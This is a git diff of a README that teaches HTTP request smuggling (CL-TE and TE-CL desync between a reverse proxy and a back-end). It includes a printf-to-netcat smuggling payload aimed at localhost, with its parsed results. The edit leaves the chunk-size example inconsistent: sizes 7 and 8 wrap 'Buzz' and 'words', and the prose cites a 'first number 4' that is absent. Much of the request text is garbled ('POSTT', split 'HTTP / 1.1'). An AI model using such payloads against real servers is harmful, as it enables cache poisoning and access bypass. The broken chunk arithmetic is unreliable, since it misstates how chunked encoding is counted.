@@ -1,9 +1,12 @@
 # HTTP-Smuggling 
 ![20191205171217](https://user-images.githubusercontent.com/25066959/70326865-8d21ea00-1803-11ea-8362-e9a51d7937d2.jpeg)    
 
-### Inspiration: In Defcon 27 in 2019, @James Kettle proposed HTTP Desync Attacks: Smashing into the Cell Next Door ), explaining how to use PayPal's vulnerabilities to be discovered using HTTP Smuggling technology.        
+### Inspiration: In Defcon 27 in 2019, @James Kettle proposed HTTP Desync Attacks: Smashing into the Cell Next Door ), explaining how to use PayPal's vulnerabilities to be discovered using HTTP Smuggling technology.           
 
 #### Things we need to understand to understand this attack go over Transfer encoding, Message Body, Pipelining.
+
+### Quick what this attack vector about?
+The HTTP Smuggling attack is based on the inconsistency between the reverse proxy and the backend server in parsing and processing HTTP requests. Using this difference, we can “embed” another HTTP request in order to achieve our purpose of “smuggling” the request. It directly shows that we can access intranet services or cause some other attacks.    
 
 Kinda how it works:   
 Each time a client makes an HTTP request it needs to establish a TCP connection with the server. Essentially we need to obtain the content of a web page, not only requested HTML documents but also various resources like Images, JS, CSS. The load overhead is so great actually that this is the reason `Keep-Alive` and `Pipeline` was introduced in HTTP 1.1.     
@@ -33,7 +36,7 @@ Regardless refer to this RFC to learn more about `Chunked Transfer Coding` https
 
 All we need to understand is it's structure. Also refer to wikipedia https://en.wikipedia.org/wiki/Chunked_transfer_encoding. So for example if we want to use chunked to send the following message 
 
-`Olivier Laflamme in \ r \ n \ r \ n chunks.`   
+`Buzzwords in \ r \ n \ r \ n chunks.`   
 We can send it like this:
  ```
 POSTT / xxx HTTP / 1.1
@@ -42,11 +45,101 @@ Content-Type : text / plain
 Transfer-Encoding : chunked
 
 7 \ r \ n
-Olivier \ r \ n
+Buzz \ r \ n
 8 \ r \ n
-Laflamme \ r \ n
+words \ r \ n
 e \ r \ n
 in \ r \ n \ r \ nchunks. \ R \ n
 0 \ r \ n
 \ r \ n
+```
+For a brief explanation, we use `\r\n` (CRLF injection (look it up)) , so here `\r\n`  are two bytes ; the first number 4 indicates that there will be 4 bytes of data, which is the 4 letters of Buzz, and then according to RFC The document standard, the letter Buzz part needs to be followed by the` \r\n` chunk-data part, the number 4 needs to be followed by the `\r\n` chunk-size part, and the number is a hexadecimal number, such as the third data.    
+
+```
+e \ r \ n
+in \ r \ n \ r \ n chunks. \ r \ n
+```
+Here among the first space data is present `\r\n` count of two characters, the last `\r\n` data representing the end, this is the case, a first space in bytes + 2 bytes + 2 `\r\n` count 4 bytes + chunks. 7 Bytes = 14 bytes. The hexadecimal representation is 14 which is e.
+The last one `0\r\n\r\n` indicates the end of the chunk section.
+#### So what? 
+In itself, these things are not harmful, and they are used to increase the network transmission rate in various ways, but in some special cases, some corresponding security problems will occur.    
+
+So reverse proxy and back-end server will not use pipeline technology, or even keep-alive. Which sucks for us attackers. The measures taken by the reverse proxy is to reuse the TCP connection, because for the reverse proxy and back-end server IPs are relatively fixed, and requests from different users establishing a link with the back-end server through the proxy server, and it is logical to reuse the TCP link between the two. Isn't really a thing?    
+
+![Capture](https://user-images.githubusercontent.com/25066959/70369350-e6326200-1885-11ea-9549-fdabe27a7917.PNG)   
+
+![Capture](https://user-images.githubusercontent.com/25066959/70369415-00207480-1887-11ea-9b6c-427b16f6a648.PNG)
+
+So smuggling 
+![Capture](https://user-images.githubusercontent.com/25066959/70369423-17f7f880-1887-11ea-9222-8346c4ad43f8.PNG)
+
+Therefore. When we send a vague HTTP request to the proxy server, the proxy server may consider this to be an HTTP request, and then forward it to the backend origin server, but the origin server After parsing and processing, only a part of it is considered as a normal request is ‘accepted’ but this includes the remaining part smuggled request. When this part affects the request of a normal user, an HTTP smuggling attack is implemented.
+
+#### The Attack
+
+Methodology: We know that both Content-Length and Transfer-Encoding can be used 
+as a way to process the body when transmitting POST data.    
+ 
+Terms we’ll be using:
+`CL-TE` means that Front uses Content-Length first, and Backend gives priority to Transfer-Encoding.   
+`TE-CL` means that Front will give priority to Transfer-Encoding, and Backend will give priority to Content-Length.    
+
+In addition, Front represents a typical front-end server such as a reverse proxy, and Backend represents a back-end business server that processes requests. In the following \r\n, CRLF is replaced by two bytes.
+	
+```
+printf 'GET / HTTP / 1.1 \ r \ n' \
+'Host: localhost \ r \ n' \
+'Content-length: 56 \ r \ n' \
+'Transfer-Encoding: chunked \ r \ n' \
+'Dummy: Header \ r \ n \ r \ n ' \
+' 0 \ r \ n ' \
+' \ r \ n ' \
+' GET / tmp HTTP / 1.1 \ r \ n ' \
+' Host: localhost \ r \ n ' \
+' Dummy: Header \ r \ n ' \
+' \ r \ n ' \
+' GET / tests HTTP / 1.1 \ r \ n ' \
+' Host: localhost \ r \ n ' \
+' Dummy: Header \ r \ n ' \
+' \ r \ n ' \
+| nc -q3 127.0.0.1 8080
+```   
+The above correct resolution should be resolved into three requests:    
+```
+GET / HTTP / 1.1
+Host: localhost
+Content-length: 56
+Transfer-Encoding : chunked
+Dummy: Header
+
+0
+``` 
+```
+GET / tmp HTTP / 1.1
+Host: localhost
+Dummy: Header
+```
+```
+GET / tests HTTP / 1.1
+Host: localhost
+Dummy: Header
+```
+If there is a TE & CL priority problem, it will be parsed into two requests:    
+```
+GET / HTTP / 1.1 [CRLF]
+Host: localhost [CRLF]
+Content-length: 56 [CRLF]
+Transfer-Encoding : chunked [CRLF] (ignored and removed, hopefully)
+Dummy: Header [CRLF]
+[CRLF]
+0 [CRLF] (start of 56 bytes of body)
+[CRLF]
+GET / tmp HTTP / 1.1 [CRLF]
+Host: localhost [CRLF]
+Dummy: Header [CRLF] (end of 56 bytes of body, not parsed)
+```
+```
+GET / tests HTTP / 1.1
+Host: localhost
+Dummy: Header
 ```
